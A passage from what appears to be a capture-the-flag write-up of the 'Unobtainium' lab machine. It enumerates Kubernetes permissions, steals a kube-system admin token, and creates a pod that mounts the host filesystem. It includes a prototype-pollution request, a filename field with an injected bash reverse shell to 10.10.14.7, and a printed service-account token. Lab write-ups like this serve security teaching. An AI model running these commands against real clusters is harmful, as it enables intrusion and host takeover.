                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></code></pre></div></div>

<p>On the list, many things don’t look immediately interesting. I can list other namespaces:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get namespaces <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">NAME              STATUS   AGE
default           Active   81d
dev               Active   81d
kube-node-lease   Active   81d
kube-public       Active   81d
kube-system       Active   81d
</span></code></pre></div></div>

<p>I’ll check permissions on the other namespaces with <code class="language-plaintext highlighter-rouge">-n [namespace]</code>. For the three kube-* ones, the permissions look the same as default. For dev, there’s an additional resource, <code class="language-plaintext highlighter-rouge">pods</code>, which shows I have <code class="language-plaintext highlighter-rouge">get</code> and <code class="language-plaintext highlighter-rouge">list</code> permissions:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">-n</span> dev <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></code></pre></div></div>

<p>There are three running pods:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get pods <span class="nt">-n</span> dev <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         81d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         81d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         81d
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">describe pod [podname]</code> will give a bunch of info about each of the three pods. All three look similar, though with different IPs and times:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl describe pod devnode-deployment-cd86fb5c-qlxww <span class="nt">-n</span> dev <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>default-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Name:         devnode-deployment-cd86fb5c-qlxww
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 13:16:21 -0500
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  &lt;none&gt;
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://9d7da0a6f82dacd0869a8c64c5f8cac2bff2760d265831c7f4492325f6ea11f8
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Wed, 07 Apr 2021 15:58:36 -0400
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 12:01:33 -0400
      Finished:     Wed, 24 Mar 2021 12:02:12 -0400
    Ready:          True
    Restart Count:  29
    Environment:    &lt;none&gt;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  &lt;none&gt;
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          &lt;none&gt;
</span></code></pre></div></div>

<h3 id="dev-container">Dev Container</h3>

<h4 id="enumeration-1">Enumeration</h4>

<p>All three pods are reachable from within the first container:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>3..5<span class="o">}</span><span class="p">;</span> <span class="k">do </span>ping <span class="nt">-c</span> 1 172.17.0.<span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="p">;</span> <span class="k">done</span>
<span class="go">PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.046 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.046/0.000 ms

PING 172.17.0.4 (172.17.0.4) 56(84) bytes of data.
64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.028 ms

--- 172.17.0.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.028/0.028/0.028/0.000 ms

PING 172.17.0.5 (172.17.0.5) 56(84) bytes of data.
64 bytes from 172.17.0.5: icmp_seq=1 ttl=64 time=0.091 ms

--- 172.17.0.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.091/0.091/0.091/0.000 ms
</span></code></pre></div></div>

<p>I grabbed a copy of <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">statically compiled nmap</a> and uploaded it to the container. It shows one port open on each, port 3000:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/tmp#</span><span class="w"> </span>./nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.17.0.3
<span class="go">
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-08 19:03 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000024s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  unknown
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
</span></code></pre></div></div>

<p>Port 3000 is the default port for Node ExpressJS applications. It also returns <code class="language-plaintext highlighter-rouge">[]</code> on <code class="language-plaintext highlighter-rouge">/</code> just like the Node app on the main host port 31337:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/tmp#</span><span class="w"> </span>curl 172.17.0.3:3000
<span class="go">[]
</span></code></pre></div></div>

<h4 id="exploit">Exploit</h4>

<p>I’ll see if this container is vulnerable to the same exploit I used to get a foothold. First, add <code class="language-plaintext highlighter-rouge">canUpload</code>:</p>

<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span>curl <span class="nt">-X</span> PUT http://172.17.0.3:3000/ <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'</span>
<span class="go">{"ok":true}
</span></code></pre></div></div>

<p>Now inject reverse shell:</p>

<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@webapp-deployment-5d764566f4-mbprj:/#</span><span class="w"> </span>curl <span class="nt">-X</span> POST http://172.17.0.3:3000/upload <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1\""}'</span>
</code></pre></div></div>

<p>At <code class="language-plaintext highlighter-rouge">nc</code>, there’s a connection:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
<span class="go">listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.235] 47198
id
uid=0(root) gid=0(root) groups=0(root)
hostname
devnode-deployment-cd86fb5c-6ms8d
</span></code></pre></div></div>

<p>And I’ll upgrade my shell the same as before.</p>

<h2 id="shell-as-root">Shell as root</h2>

<h3 id="enumeration-2">Enumeration</h3>

<h4 id="inside-container">Inside Container</h4>

<p>The namespace associated with this container is, unsurprisingly, dev:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@devnode-deployment-cd86fb5c-6ms8d:/run/secrets/kubernetes.io/serviceaccount#</span><span class="w"> </span><span class="nb">cat </span>namespace   
<span class="go">dev
</span></code></pre></div></div>

<p>I’ll grab the <code class="language-plaintext highlighter-rouge">token</code> for use with the API (the <code class="language-plaintext highlighter-rouge">ca.crt</code> is the same).</p>

<h4 id="api-1">API</h4>

<p>I’ll do the same <code class="language-plaintext highlighter-rouge">auth can-i --list</code> commands as before with the new token. Nothing interesting for the dev namespace:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>dev-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></code></pre></div></div>

<p>The results are the same for default, kube-node-lease, and kube-public. For kube-system, there’s an additional permission:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">-n</span> kube-system <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>dev-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></code></pre></div></div>

<p>dev can <code class="language-plaintext highlighter-rouge">get</code> and <code class="language-plaintext highlighter-rouge">list</code> the secrets resource.</p>

<p>There’s a bunch of secrets available:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get secrets <span class="nt">-n</span> kube-system <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>dev-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      81d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      81d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      81d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      81d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      81d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      81d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      81d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      81d
default-token-l85f2                              kubernetes.io/service-account-token   3      81d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      81d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      81d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      81d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      81d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      81d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      81d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      81d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      81d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      81d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      81d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      81d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      81d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      81d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      81d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      81d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      81d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      81d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      81d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      81d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      81d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      81d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      81d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      81d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      81d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      81d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      81d
</span></code></pre></div></div>

<p>Working down the list, the first one I picked to play with was <code class="language-plaintext highlighter-rouge">c-admin-token-tfmp2</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl describe secret c-admin-token-tfmp2 <span class="nt">-n</span> kube-system <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>dev-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       &lt;none&gt;
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
ca.crt:     1066 bytes
</span></code></pre></div></div>

<h4 id="api-as-admin">API as Admin</h4>

<p>Now with that admin token, I’ll check authorities again:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl auth can-i <span class="nt">--list</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
</span></code></pre></div></div>

<p>The first line says that this user can do all commands on all resources - full admin.</p>

<p>For example (and use in a minute), I can list pods across all namespaces:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get pods <span class="nt">--all-namespaces</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">NAMESPACE     NAME                                  READY   STATUS             RESTARTS   AGE
default       webapp-deployment-5d764566f4-h5zhw    1/1     Running            7          52d
default       webapp-deployment-5d764566f4-lrpt9    1/1     Running            7          52d
default       webapp-deployment-5d764566f4-mbprj    1/1     Running            7          52d
dev           devnode-deployment-cd86fb5c-6ms8d     1/1     Running            28         81d
dev           devnode-deployment-cd86fb5c-mvrfz     1/1     Running            29         81d
dev           devnode-deployment-cd86fb5c-qlxww     1/1     Running            29         81d
kube-system   backup-pod                            0/1     CrashLoopBackOff   347        80d
kube-system   coredns-74ff55c5b-sclll               1/1     Running            31         81d
kube-system   etcd-unobtainium                      1/1     Running            0          23h
kube-system   kube-apiserver-unobtainium            1/1     Running            0          23h
kube-system   kube-controller-manager-unobtainium   1/1     Running            34         81d
kube-system   kube-proxy-zqp45                      1/1     Running            31         81d
kube-system   kube-scheduler-unobtainium            1/1     Running            31         81d
kube-system   storage-provisioner                   1/1     Running            63         81d
</span></code></pre></div></div>

<h3 id="filesystem-as-root">Filesystem as root</h3>

<h4 id="find-image">Find Image</h4>

<p>As with previous docker attacks, the idea is to create a new container and map the host filesystem into the container, where I will be root. That is basically root access to the host filesystem. The YAML files described in the articles all involve pulling docker images from the internet. Because Unobtainium won’t have internet access, I’ll opt to work from an image that’s already on the host.</p>

<p>I can get the full YAML for a pod with <code class="language-plaintext highlighter-rouge">get pod [name] -n [namespace]</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get pod webapp-deployment-5d764566f4-h5zhw <span class="nt">-o</span> yaml <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">apiVersion: v1
kind: Pod              
metadata:                                     
  creationTimestamp: "2021-02-15T18:15:14Z"
  generateName: webapp-deployment-5d764566f4-
  labels:              
    app: webapp                               
    pod-template-hash: 5d764566f4
  name: webapp-deployment-5d764566f4-h5zhw
  namespace: default   
  ownerReferences:                            
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true   
    kind: ReplicaSet                          
    name: webapp-deployment-5d764566f4
    uid: 3cb2f003-ad0a-4b62-8678-ef8a552554c6
  resourceVersion: "19306"
  uid: 2b7cd0d1-d2a3-4057-a797-c1b1317a9ee9
spec:                        
  containers:
  - image: localhost:5000/node_server
    imagePullPolicy: Always
    name: webapp
...[snip]...
</span></code></pre></div></div>

<p>I’ll loop over all the pods and see what images they are running. There’s only two:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl get pods <span class="nt">--all-namespaces</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt | <span class="nb">grep</span> <span class="nt">-v</span> NAMESPACE | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nv">ns</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$line</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span><span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$line</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span><span class="p">;</span> kubectl get pod <span class="nv">$name</span> <span class="nt">-o</span> yaml <span class="nt">-n</span> <span class="nv">$ns</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt | <span class="nb">grep</span> <span class="s1">'  - image: '</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sort</span> <span class="nt">-u</span>
<span class="go">  - image: localhost:5000/dev-alpine
  - image: localhost:5000/node_server
</span></code></pre></div></div>

<p>Here’s the full command with whitespace for readability:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods <span class="nt">--all-namespaces</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
  | <span class="nb">grep</span> <span class="nt">-v</span> NAMESPACE
  | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do 
      </span><span class="nv">ns</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$line</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span><span class="p">;</span> 
      <span class="nv">name</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$line</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span><span class="p">;</span> 
      kubectl get pod <span class="nv">$name</span> <span class="nt">-o</span> yaml <span class="nt">-n</span> <span class="nv">$ns</span> <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
        | <span class="nb">grep</span> <span class="s1">'  - image: '</span><span class="p">;</span> 
    <span class="k">done</span> 
  | <span class="nb">sort</span> <span class="nt">-u</span>
</code></pre></div></div>

<p>It pulls the list of pods, gets rid of the header, and then loops over each line. For each, it gets the namespace (<code class="language-plaintext highlighter-rouge">$ns</code>) and the pod name (<code class="language-plaintext highlighter-rouge">$name</code>), and then calls the API to get the full YAML. It uses <code class="language-plaintext highlighter-rouge">grep</code> to get the image location, and then all the results are passed into <code class="language-plaintext highlighter-rouge">sort -u</code> to get unique entries.</p>

<h4 id="malicious-pod">Malicious Pod</h4>

<p>I’ll create a YAML to describe my pod:</p>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span> 
<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
<span class="na">metadata</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">alpine</span>
  <span class="na">namespace</span><span class="pi">:</span> <span class="s">kube-system</span>
<span class="na">spec</span><span class="pi">:</span>
  <span class="na">containers</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">evil0xdf</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">localhost:5000/dev-alpine</span>
    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">/bin/sh"</span><span class="pi">]</span>
    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-c"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">sleep</span><span class="nv"> </span><span class="s">300000"</span><span class="pi">]</span>
    <span class="na">volumeMounts</span><span class="pi">:</span> 
    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/mnt</span>
      <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
  <span class="na">volumes</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">hostfs</span>
    <span class="na">hostPath</span><span class="pi">:</span>  
      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>
  <span class="na">automountServiceAccountToken</span><span class="pi">:</span> <span class="kc">true</span>
  <span class="na">hostNetwork</span><span class="pi">:</span> <span class="kc">true</span>
</code></pre></div></div>

<p>I choose alpine because it’s smaller, but I later tested and node_server works too.</p>

<p>I’ve added the host filesystem <code class="language-plaintext highlighter-rouge">/</code> as a mount point inside the container.</p>

<p>Pods (like Docker containers) run until their main command is done. I’ll just add a long sleep as the main command (<code class="language-plaintext highlighter-rouge">tail -f /dev/null</code> is another good one to hold priority).</p>

<p>Now I’ll start the container with the <code class="language-plaintext highlighter-rouge">apply</code> command:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>kubectl apply <span class="nt">-f</span> root.yaml <span class="nt">--token</span> <span class="si">$(</span><span class="nb">cat </span>cadmin-token<span class="si">)</span> <span class="nt">--server</span> https://10.10.10.235:8443 <span class="nt">--certificate-authority</span> ca.crt
<span class="go">pod/evil0xdf created
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">exec</code> command allows me to run <code class="language-plaintext highlighter-rouge">/bin/sh</code> inside the container:</p>

